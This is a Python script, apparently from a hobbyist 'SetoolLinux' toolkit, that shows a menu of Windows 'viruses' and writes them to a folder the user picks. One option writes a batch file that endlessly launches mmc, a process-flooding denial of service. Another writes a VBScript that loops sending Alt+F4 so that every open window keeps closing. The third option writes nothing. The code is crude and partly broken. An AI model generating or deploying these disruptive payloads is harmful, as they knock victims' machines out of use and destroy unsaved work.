#the virus attack 
#auther:
#virus 

#THE START LOGO 
#USE 'DEF' DO
def fileload():
    print("")
    print("finish the file:setoolLin.py...")
    print("finish the file:virusattack.py")
    print("finish the date file:date.txt")
    with open("date.txt","a") as f:
        f.write("the virusattack finish...")
    f.close()
    #======================================
def onlaoding():
    print("")
    print("")
    print("===========================")
    print("--SetoolLinux>>Virus Attack--")
    print("===========================")
    print("")
    print("")

#end the def 
fileload()
#to run the function

def re():
    print("")
    return True

onlaoding()
#run the function onlaoding() , It's the start logo to show .

def list():
    print("List Of The Virus-->")
    print("")
    #show the meau of the virus attack console
    #the list of the virus 
    print("Virus                 System                  File")
    print("1:-Window Virus       -Windows               *.bat")
    print("2:-Key Virus          -Windows               *.vbs")
    print("3:-Blue screen Virus  -Windows               *.bat")
    #end the list 
    #-window virus ; key virus ; blue screen virus
    print("Enter The Key 4 Back")
    print("==================================================")

list()
#the function list()
th = input("SetoolLinux_>Virus Attack_>")

con1 = "Window Virus"
con2 = "Key Virus"
con3 = "Blue Screen Virus"
if th == "use 1" :
    print("Content:" + con1)
    print("")
    print("You Enter The Virus Path Must: .../.../")
    filepath = input("Enter The Virus Path To Make:")
    import os
    #the reture is true
    if os.path.exists(filepath):
        print("The File Path True...")
        #write the virus to the file
        file = filepath +"index.bat"
        with open(file,"a") as f:
            f.write(":start \r\n")
            f.write("start mmc \r\n")
            f.write("goto start \r\n")
        f.close()
            #================================================================

if th == "use 2" :
    print("Content:" + con2)
    print("")
    print("You Enter The Virus Path Must: .../.../")
    filepath = input("Enter The Virus Path To Make:")
    import os
    #the reture is true
    if os.path.exists(filepath):
        print("The File Path True...")
        #write the virus to the file
        file = filepath +"index.vbs"
        with open(file,"a") as f:
            f.write("set ws = CreateObject('Wscript.shell')\r\n")
            f.write("do\r\n")
            f.write("ws.Sendkeys'%{F4}'\r\n")
            f.write("loop\r\n")
        f.close()
            #================================================================
#=======================================================
#wirte the virus to the file
#end the 'use 1'
#============================================

if th == "use 3" :
    print("Content:" + con3)
    print("")
    print("The File Path True...")
    print("save the file in the /SetoolLinux/formwork/index.bat")
    a = input("")
    #================================================================


if th == "4":
    import os
    os.system("python3 setoollin.py")
    #back the main software
    #end the cirus attack
    def re():
        return True

    re()
else :
    import os
    os.system("python3 virusattack.py")


print("")
print("[!]loading...")
print("[!]The Virus Loading...")
print("[!]Finish the file")
import os
os.system("python3 setoollin.py")